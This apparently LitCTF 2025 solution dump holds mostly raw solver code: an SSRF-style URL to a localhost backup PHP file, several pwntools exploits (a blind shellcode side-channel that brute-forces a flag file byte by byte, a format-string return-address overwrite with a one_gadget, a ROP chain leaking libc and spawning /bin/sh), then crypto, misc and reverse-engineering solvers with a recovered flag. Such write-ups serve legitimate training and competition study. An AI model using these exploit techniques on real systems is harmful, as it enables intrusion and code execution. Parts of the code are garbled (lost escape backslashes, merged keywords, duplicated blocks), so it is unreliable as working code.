/api/sys/urlcode.php？url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php
from pwn import *
from struct import pack
import time
import random
import ctypes
#from LibcSearcher import *
from ae64 import AE64

def bug():
    gdb.attach(p)
    pause()

def s(a):
    p.send(a)

def sa(a,b):
    p.sendafter(a,b)

def sl(a):
    p.sendline(a)

def sla(a,b):
    p.sendlineafter(a,b)

def r(a):
    return p.recv(a, timeout=1)

def rl(a):
    return p.recvuntil(a, timeout=1)

def inter():
    p.interactive()

def get_addr(size):
    return u64(p.recv(size).ljust(8,b'x00'))

def get_addr64():
    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))

def get_addr32():
    return u32(p.recvuntil("xf7")[-4:])

def get_sb():
    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()

def get_hook():
    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']

li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

def log_info(message, status=None):
    color_codes = {
        'success': ' 33[92m',
        'error': ' 33[91m',
        'warning': ' 33[93m',
        None: ' 33[95m'
    }
    color = color_codes.get(status, ' 33[95m')
    print(f"{color}[*] {message} 33[0m")

def get_random_delay():
    return random.uniform(0.1, 0.5)

context(os='linux', arch='amd64', log_level='error')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')

# 完整字符集
full_charset = "{}0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# 直接在此处设置已知前缀（修改此行即可）
FLAG_PREFIX = "flag{"  # <-- 在此处修改前缀

if not FLAG_PREFIX:
    log_info("未设置前缀，将使用完整字典爆破", 'warning')
    initial_index = 0
else:
    initial_index = len(FLAG_PREFIX)
    log_info(f"将从位置 {initial_index} 开始爆破，前缀: {FLAG_PREFIX}", 'success')

s = full_charset
char_list = [ord(x) for x in s]
flag = FLAG_PREFIX  # 初始化flag为预设前缀

shellcode = """
mov rdi, 0x67616c662f2e
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov bl, byte ptr [rsp+{}]
cmp bl, {}
jz $-0x3 
"""

index = initial_index
MAX_RETRY = 5
MAX_CONSECUTIVE_FAILURES = 10
consecutive_failures = 0

while True:
    if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
        log_info("检测到信道不稳定，暂停5秒后重试", 'warning')
        time.sleep(5)
        consecutive_failures = 0

    for i in range(len(s)):
        retry_count = MAX_RETRY
        success = False

        while retry_count > 0 and not success:
            time.sleep(get_random_delay())

            try:
                # 切换本地/远程模式
                p = process('./pwn')
                #p = remote('node8.anna.nssctf.cn', 22581)

                payload = asm(shellcode.format(index, char_list[i]))
                sla(b'Please input your shellcode: n', payload)

                try:
                    judge = rl(b'n')
                
except (EOFError, TimeoutError):
                    log_info(f"字符 {s[i]} 导致连接关闭，重试 ({MAX_RETRY-retry_count+1}/{MAX_RETRY})", 'warning')
                    retry_count -= 1
                    consecutive_failures += 1
                    p.close()
                    continue

                if len(judge) < 3:
                    flag += s[i]
                    log_info(f"找到字符: {s[i]}, 当前flag: {flag}", 'success')
                    index += 1
                    success = True
                    consecutive_failures = 0

                p.close()

            
except Exception as e:
                log_info(f"连接异常: {str(e)}，剩余重试: {retry_count}", 'error')
                retry_count -= 1
                consecutive_failures += 1
                if p:
                    p.close()
            finally:
                if p:
                    p.close()

        if success:
            break

    if '}' in flag:
        log_info(f"最终flag: {flag}", 'success')
        exit(0)

inter()
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr(size):
	return u64(p.recv(size).ljust(8,b'x00'))
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc-2.31.so')   

elf=ELF('./fmt')
#p=remote('',)
p = process('./fmt')
rl(b'0x')
stack=int(p.recv(12),16)
li(hex(stack))
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['puts']
li(hex(libc_base))
ogg=libc_base+0xe3b01
addr=(stack&0xffff)-15
payload  = b'%p'*9
payload += b'%'+str(addr - 92).encode()+b'c%hn'#11
payload += b'%'+str(0x10007b-addr).encode()+b'c%39$hhn'
#bug()
s(payload)
add=(stack+17-0x18)&0xffff
li(hex(add))
sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg&0xffff)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add+2-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg>>16&0xffff)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add+2+2-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg>>32)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

payload = b'%'+str(0x069e).encode()+b'c%39$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

#a=p.recvall()
#print(len(a)-1

inter()
payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(elf.plt['puts'])
payload+= p64(0x401100)+p64(0x4011AD)
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr(size):
	return u64(p.recv(size).ljust(8,b'x00'))
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   

elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

rl("Welcome to LitCTF2025!")
payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(elf.plt['puts'])
payload+= p64(0x401100)+p64(0x4011AD)
#bug()
sl(payload)

#pause()
sleep(0.2)
p.sendline(b"A" * 4 + b"x00"*3)

p.recv(8)
p.recv(8)
tls = u64(p.recv(6) + b"x00x00")
li(hex(tls))
libc_base = tls -0x3a5740
li(hex(libc_base))
system,bin_sh=get_sb()

rl("Welcome to LitCTF2025!")
payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(system)

#bug()
sl(payload)

sleep(0.2)
#sl(b'$0x00')
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
inter()
from Crypto.Util.number import long_to_bytes, inverse

n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
e = 65537
c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505

# Since n is prime, φ(n) = n - 1
phi_n = n - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(flag.decode())
#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}
```python
from Crypto.Util.number import long_to_bytes, inverse

n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
e = 65537
c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505

# Since n is prime, φ(n) = n - 1
phi_n = n - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(flag.decode())
#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}
19
942430120937
1394236058532304847090984665696457270451329940554604681101032877003319842642
1576349568926279384369628072261252513038693891801832793244205614823946991510
9031182321353345635660995951808001555621426730805001745903972812720437922952
2534539199629164033610855636022774785947855765161278825011688773880094229014
8741
from z3 import *

def recover_factors_z3(n_val, s_val):
    p = Int('p')
    q = Int('q')

    solver = Solver()
    solver.add(p * q == n_val)
    solver.add(p + q == s_val)
    solver.add(p > 1, q > 1)

    if solver.check() == sat:
        model = solver.model()
        pv = model[p].as_long()
        qv = model[q].as_long()
        return min(pv, qv), max(pv, qv)
    else:
        returnNone

n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141       
pplusq = 264904851121137920947287086482326881385752688705374889409196246630630770102009950641809599308303022933372963797747735183944234823071639906681654992838707159246410571356707755892308435202955680710788529503317217548344168832053609281562447929541166386062570844327209330092595380642976752220867037216961082705142     

res = recover_factors_z3(n, pplusq)
if res:
    p, q = res
    phi = (p-1)*(q-1)
    d = inverse(e, phi)
    flag = long_to_bytes(pow(c, d, n))
    print(f"[+] p = {p}")
    print(f"[+] q = {q}")
    print(flag)
from Crypto.Util.number import *
import gmpy2
import itertools

def small_roots(f, bounds, m=1, d=None):
    ifnot d:
        d = f.degree()
        print(d)
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
    B = B.dense_matrix().LLL()
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

e = 1915595112993511209389477484497
n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951
c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399
leak = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930

leak = leak << 180
R.<x,y> = PolynomialRing(Zmod(n))
f = e * (leak + x) + (y - 1)
res = small_roots(f,(2^180,2^101),m=1,d=3)
for root in res:
    dp_low = root[0]
    dp = leak + dp_low
    tmp = pow(2,e*dp,n) - 2
    p = gmpy2.gcd(tmp,n)
    q = n // p
    d = inverse(e,(p-1)*(q-1))
    m = pow(c,d,n)
    print(long_to_bytes(m))
def process_file(input_file, output_file):
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        data = f_in.read()
        i = 0
        while i < len(data) - 3:  # 需要至少4字节: f3 a0 (84/85) XX
            # 检查是否匹配 0xf3 0xa0
            if data[i] == 0xf3 and data[i+1] == 0xa0:
                opcode = data[i+2]
                
                # 确定要加的值
                if opcode == 0x85:
                    add_value = 0xd0
                elif opcode == 0x84:
                    add_value = 0x90
                else:
                    i += 1
                    continue
                
                # 处理下一个字节
                if i + 3 < len(data):
                    original_byte = data[i+3]
                    result_byte = (original_byte + add_value) % 256  # 防止溢出
                    f_out.write(bytes([result_byte]))
                
                i += 4  # 跳过已处理的4字节
            else:
                i += 1

process_file('hidden-word.txt', '2.txt')
print("处理完成！结果字节已保存到2.txt")
import numpy as np
 key_bytes = b'LitCTF2025'
 key_length = len(key_bytes)
 encoded_vector = [
     5776, 15960, 28657, 34544, 40294, 43824, 51825, 53033, 58165, 58514,
     61949, 56960, 53448, 49717, 47541, 45519, 40607, 40582, 38580, 42320,
     41171, 41269, 39370, 44224, 48760, 49558, 48128, 46531, 47088, 46181,
     46707, 46879, 48098, 52047, 53933, 56864, 60564, 64560, 66744, 63214,
     60873, 58245, 55179, 56857, 51532, 44308, 32392, 27577, 19654, 14342,
     11721, 9112, 6625
 ]
 message_length = 44
 equation_count = len(encoded_vector)
 coefficient_matrix = np.zeros((equation_count, message_length), dtype=int)
for col in range(message_length):
     for offset in range(key_length):
         coefficient_matrix[col + offset][col] = key_bytes[offset]

 encoded_array = np.array(encoded_vector)
 decoded_floats, _, _, _ = np.linalg.lstsq(coefficient_matrix, encoded_array, rcond=None)
 decoded_bytes = bytes([round(val) for val in decoded_floats])
print(decoded_bytes)
    #include <stdio.h>
 #include <stdint.h>
 //解密函数
 void decrypt (uint32_t* v, uint32_t* k) {
     uint32_t v0=v[0], v1=v[1], i; 
  uint32_t delta=0x114514;  
  uint32_t sum=delta*32;                 
     uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
     for (i=0; i<32; i++) {                         /* basic cycle start */
         v1 -= (k[3] + (v0 >> 5)) ^ (sum+ v0) ^ (k[2] + 16 * v0);
         v0 -= (k[1] + (v1 >> 5)) ^ (sum+ v1) ^ (*k + 16 * v1);
         sum-= 0x114514;
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
 }
 void encrypt (uint32_t* v, uint32_t* k) {
     uint32_t v0=v[0], v1=v[1], i; 
  uint32_t delta=0x61C88747;  
  uint32_t sum=-delta*0x40;                 
     uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
     for (i=0; i<0x40; i++) {                         /* basic cycle start */
         v1 -= v0 ^ (k [((sum >> 11) & 3)] + sum) ^ (v0 + ((v0 >> 5) ^ (v0<<4)));
         sum += 0x61C88747;
         v0 -= v1 ^ (k[ (sum & 3)] + sum) ^ (v1 + ((v1 >> 5) ^ ( v1 <<4 )));
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
 }
  int main() {
     uint32_t key[]={0x11223344,0x55667788,0x99AABBCC,0xDDEEFF11};
  uint32_t enc[40]={0x977457FE, 0xDA3E1880, 0xB8169108, 0x1E95285C, 0x1FE7E6F2, 0x2BC5FC57, 0xB28F0FA8, 0x8E0E0644, 0x68454425, 0xC57740D9};
for (size_t i = 0; i < 10; i+=2)
  {
   decrypt(enc+i,key);

  }
  puts((char*)enc);

 }
5 0 RESUME 0
 6 2 LOAD_GLOBAL 1 (NULL + input)
 14 LOAD_CONST 1 ('input your flag > ')
 16 PRECALL 1
 20 CALL 1
 30 LOAD_METHOD 1 (encode)
 52 PRECALL 0
 56 CALL 0
 66 STORE_FAST 0 (user_input)
 8 68 BUILD_LIST 0
 70 STORE_FAST 1 (decrypted)
 9 72 LOAD_GLOBAL 5 (NULL + range)n84 LOAD_GLOBAL 7 (NULL + len)
 96 LOAD_FAST 0 (user_input)
 98 PRECALL 1
 102 CALL 1
 112 PRECALL 1
 116 CALL 1
 126 GET_ITER
 >> 128 FOR_ITER 34 (to 198)
 130 STORE_FAST 2 (i)
 10 132 LOAD_FAST 0 (user_input)
 134 LOAD_FAST 2 (i)
 136 BINARY_SUBSCR
 146 LOAD_CONST 2 (6)
 148 BINARY_OP 10 (-)
 152 STORE_FAST 3 (b)
 11 154 LOAD_FAST 1 (decrypted)
 156 LOAD_METHOD 4 (append)
 178 LOAD_FAST 3 (b)
 180 PRECALL 1
 184 CALL 1
 194 POP_TOP
 196 JUMP_BACKWARD 35 (to 128)
 13 >> 198 BUILD_LIST 0
 200 LOAD_CONST 3 ((85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169))
 202 LIST_EXTEND 1
 204 STORE_FAST 4 (fflag)
 14 206 BUILD_LIST 0
 208 LOAD_CONST 4 ((19, 55, 192, 222, 202, 254, 186, 190))
 210 LIST_EXTEND 1
 212 STORE_FAST 5 (key_ints)
 16 214 LOAD_CONST 5 (<code object encrypt at 0x0000019CC7F9DFD0, file "d:
codePYTHONIPParser1.py", line 16>)
 216 MAKE_FUNCTION 0
 218 STORE_FAST 6 (encrypt)
 23 220 PUSH_NULL
 222 LOAD_FAST 6 (encrypt)
 224 LOAD_FAST 4 (fflag)
 226 LOAD_FAST 5 (key_ints)
 228 PRECALL 2
 232 CALL 2
 242 STORE_FAST 7 (encrypted_flag)
 25 244 LOAD_FAST 1 (decrypted)
 246 LOAD_FAST 7 (encrypted_flag)
 248 COMPARE_OP 2 (==)
 254 POP_JUMP_FORWARD_IF_FALSE 17 (to 290)
 26 256 LOAD_GLOBAL 11 (NULL + print)
 268 LOAD_CONST 6 ('Good job! You made it!')
 270 PRECALL 1
 274 CALL 1
 284 POP_TOP
 286 LOAD_CONST 0 (None)
 288 RETURN_VALUE
 28 >> 290 LOAD_GLOBAL 11 (NULL + print)
 302 LOAD_CONST 7 ("Nah, don't give up!")
 304 PRECALL 1
 308 CALL 1
 318 POP_TOP
 320 LOAD_CONST 0 (None)
 322 RETURN_VALUE
Disassembly of <code object encrypt at 0x0000019CC7F9DFD0, file "d:
codePYTHONIPParser1.py", line 16>:
 16 0 RESUME 0
 17 2 BUILD_LIST 0
 4 STORE_FAST 2 (result)
 18 6 LOAD_GLOBAL 1 (NULL + range)
 18 LOAD_GLOBAL 3 (NULL + len)
 30 LOAD_FAST 0 (flag_bytes)
 32 PRECALL 1
 36 CALL 1
 46 PRECALL 1
 50 CALL 1
 60 GET_ITER
 >> 62 FOR_ITER 56 (to 176)
 64 STORE_FAST 3 (i)
 19 66 LOAD_FAST 0 (flag_bytes)
 68 LOAD_FAST 3 (i)
 70 BINARY_SUBSCR
 80 LOAD_FAST 1 (key)
 82 LOAD_FAST 3 (i)
 84 LOAD_GLOBAL 3 (NULL + len)
 96 LOAD_FAST 1 (key)
 98 PRECALL 1
 102 CALL 1
 112 BINARY_OP 6 (%)
 116 BINARY_SUBSCR
 126 BINARY_OP 12 (^)
 130 STORE_FAST 4 (b)
 20 132 LOAD_FAST 2 (result)
 134 LOAD_METHOD 2 (append)
 156 LOAD_FAST 4 (b)
 158 PRECALL 1
 162 CALL 1
 172 POP_TOP
 174 JUMP_BACKWARD 57 (to 62)
 21 >> 176 LOAD_FAST 2 (result)
 178 RETURN_VALUE
a=[85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169]
b=[19, 55, 192, 222, 202, 254, 186, 190]
for i in range(len(a)):
    a[i] = a[i] ^ b[i % len(b)]
    print(chr(a[i]+6), end='')
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]